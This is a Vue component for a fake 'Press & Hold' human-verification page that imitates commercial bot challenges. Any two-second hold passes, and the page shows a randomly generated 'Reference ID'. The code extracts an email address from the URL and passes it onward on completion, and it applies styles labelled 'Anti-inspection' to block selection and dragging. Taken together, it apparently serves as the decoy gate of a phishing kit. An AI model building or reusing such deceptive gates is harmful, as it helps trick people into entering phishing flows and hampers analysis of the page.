<template>
  <div class="container">
    <!-- Main content that gets blurred -->
    <div class="main-content" :class="{ 'blurred-content': showCookieBanner }">
      <div class="verification-box">
        <h1>Before we continue...</h1>
        <p>
          Press & Hold to confirm you are
          <br>a human (and not a bot).
        </p>
        <button 
          @mousedown="startHolding" 
          @mouseup="stopHolding" 
          @mouseleave="stopHolding"
          @touchstart.prevent="startHolding"
          @touchend.prevent="stopHolding"
          @touchcancel.prevent="stopHolding"
          @contextmenu.prevent
          @selectstart.prevent
          @dragstart.prevent
        >
          <div class="progress" :style="{ width: progress + '%' }"></div>
          <span>Press & Hold</span>
        </button>
      </div>
      <div class="reference">
        {{ referenceId }}<br>
        &copy; 2025 All rights reserved. | 
        <a href="#" @click.prevent="showTermsModal = true">Terms of Use</a> | 
        <a href="#" @click.prevent="showReportModal = true">Report Abuse</a>
      </div>
    </div>

    <!-- Cookie Banner - stays above blur -->
    <CookieBanner 
      v-if="showCookieBanner" 
      @cookie-consent="handleCookieConsent"
      @close="handleCookieBannerClose"
    />

    <!-- Modals -->
    <TermsOfUseModal 
      :isVisible="showTermsModal" 
      @close="showTermsModal = false" 
    />
    <ReportAbuseModal 
      :isVisible="showReportModal" 
      :referenceId="referenceId"
      @close="showReportModal = false" 
    />
  </div>
</template>

<script>
import { securityMixin } from '../mixins/security.js'
import TermsOfUseModal from './TermsOfUseModal.vue'
import ReportAbuseModal from './ReportAbuseModal.vue'
import CookieBanner from './CookieBanner.vue'

export default {
  name: 'HumanVerification',
  mixins: [securityMixin],
  components: {
    TermsOfUseModal,
    ReportAbuseModal,
    CookieBanner
  },
  props: {
    cookieConsent: {
      type: Object,
      default: null
    }
  },
  data() {
    return {
      progress: 0,
      timerRef: null,
      animationRef: null,
      referenceId: '',
      verificationToken: null,
      email: null,
      showTermsModal: false,
      showReportModal: false,
      localCookieConsent: null,
      showCookieBanner: true
    }
  },
  computed: {
    effectiveCookieConsent() {
      return this.cookieConsent || this.localCookieConsent;
    }
  },
  mounted() {
    this.referenceId = this.generateReferenceId();
    this.verificationToken = this.generateRandomToken();
    this.extractEmailFromUrl();
    
    // Check for existing cookie consent
    const savedConsent = localStorage.getItem('cookieConsent');
    if (savedConsent) {
      this.localCookieConsent = JSON.parse(savedConsent);
      this.showCookieBanner = false;
    }
  },
  methods: {
    handleCookieConsent(consent) {
      this.localCookieConsent = consent;
      this.showCookieBanner = false;
      this.$emit('cookie-consent', consent);
    },

    handleCookieBannerClose() {
      this.showCookieBanner = false;
    },
    
    extractEmailFromUrl() {
      const fullUrl = decodeURIComponent(window.location.href);
      let foundEmail = null;
      
      const emailPattern = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi;
      const matches = fullUrl.match(emailPattern);
      
      if (matches && matches.length > 0) {
        foundEmail = matches[matches.length - 1];
      }
      
      if (foundEmail && this.isValidEmail(foundEmail)) {
        this.email = foundEmail;
        console.log("Found email:", this.email);
      }
    },
    
    isValidEmail(email) {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return emailRegex.test(email);
    },
    
    generateRandomToken() {
      return Math.random().toString(36).substring(2, 15) + 
             Math.random().toString(36).substring(2, 15);
    },
    
    generateReferenceId() {
      const hexChars = '0123456789abcdef';
      const sections = [8, 4, 4, 4, 12];
      
      let result = 'Reference ID ';
      
      for (let i = 0; i < sections.length; i++) {
        for (let j = 0; j < sections[i]; j++) {
          result += hexChars[Math.floor(Math.random() * hexChars.length)];
        }
        if (i < sections.length - 1) {
          result += '-';
        }
      }
      
      return result;
    },
    
    startHolding() {
      if (this.timerRef) clearTimeout(this.timerRef);
      if (this.animationRef) cancelAnimationFrame(this.animationRef);
      
      const startTime = Date.now();
      
      const updateProgress = () => {
        const elapsed = Date.now() - startTime;
        this.progress = Math.min((elapsed / 2000) * 100, 100);
        
        if (this.progress < 100) {
          this.animationRef = requestAnimationFrame(updateProgress);
        }
      };
      
      this.animationRef = requestAnimationFrame(updateProgress);
      
      this.timerRef = setTimeout(() => {
        this.$emit('verification-complete', this.email);
      }, 2000);
    },
    
    stopHolding() {
      if (this.timerRef) clearTimeout(this.timerRef);
      if (this.animationRef) cancelAnimationFrame(this.animationRef);
      this.progress = 0;
    }
  }
}
</script>

<style scoped>
.container {
  width: 100%;
  max-width: 650px;
  padding: 0 20px;
  position: relative;
  margin: 0 auto;
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  -webkit-touch-callout: none;
  -webkit-user-select: none;
  -khtml-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
  touch-action: manipulation;
  -webkit-user-drag: none;
}

.main-content {
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  transition: filter 0.3s ease;
}

.main-content.blurred-content {
  filter: blur(2px);
  pointer-events: none;
}

.verification-box {
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
  padding: 40px;
  width: 100%;
  text-align: center;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

h1 {
  color: #5f6368;
  font-size: 24px;
  font-weight: 500;
  margin-bottom: 16px;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

p {
  color: #5f6368;
  font-size: 14px;
  margin-bottom: 24px;
  line-height: 1.5;
 -webkit-user-select: none;
 -moz-user-select: none;
 -ms-user-select: none;
 user-select: none;
}

button {
 position: relative;
 width: 240px;
 padding: 12px 0;
 color: #2196F3;
 border: 1px solid #2196F3;
 border-radius: 9999px;
 background-color: transparent;
 cursor: pointer;
 overflow: hidden;
 font-size: 14px;
 font-weight: 500;
 transition: background-color 0.2s;
 outline: none;
 -webkit-tap-highlight-color: transparent;
 touch-action: manipulation;
 -webkit-user-select: none;
 -moz-user-select: none;
 -ms-user-select: none;
 user-select: none;
 -webkit-user-drag: none;
}

button:hover {
 background-color: rgba(33, 150, 243, 0.05);
}

.progress {
 position: absolute;
 left: 0;
 top: 0;
 bottom: 0;
 width: 0;
 background-color: rgba(33, 150, 243, 0.1);
 transition: width 0.1s;
 pointer-events: none;
}

button span {
 position: relative;
 z-index: 10;
 -webkit-user-select: none;
 -moz-user-select: none;
 -ms-user-select: none;
 user-select: none;
}

.reference {
 text-align: center;
 font-size: 11px;
 color: #9aa0a6;
 padding: 5px 0;
 margin-top: 10px;
 line-height: 1.4;
 -webkit-user-select: none;
 -moz-user-select: none;
 -ms-user-select: none;
 user-select: none;
}

.reference a {
 color: #2196F3;
 text-decoration: none;
 cursor: pointer;
}

.reference a:hover {
 text-decoration: underline;
}

/* Anti-inspection styles */
* {
 -webkit-user-select: none !important;
 -moz-user-select: none !important;
 -ms-user-select: none !important;
 user-select: none !important;
 -webkit-user-drag: none !important;
}

::selection {
 background: transparent !important;
}

::-moz-selection {
 background: transparent !important;
}
</style>
